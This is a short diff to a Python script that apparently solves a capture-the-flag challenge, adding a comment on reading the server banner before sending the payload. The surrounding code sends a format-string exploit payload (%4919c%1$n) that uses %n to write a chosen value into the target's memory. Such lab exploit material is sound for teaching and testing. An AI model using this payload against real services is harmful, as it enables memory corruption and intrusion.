@@ -8,6 +8,11 @@ import socket
 
 def solve(host: str, port: int) -> str:
     with socket.create_connection((host, port), timeout=5) as connection:
+        # The server writes the welcome banner before its single input read:
+        # consume it, then send the payload as the first and only write. The
+        # server captures client input with one read(255) and tears down the
+        # connection, so any earlier bytes would be consumed first and the
+        # real payload would land on a closed socket.
         connection.recv(4096)
         connection.sendall(b"%4919c%1$n\n")
         response = b""
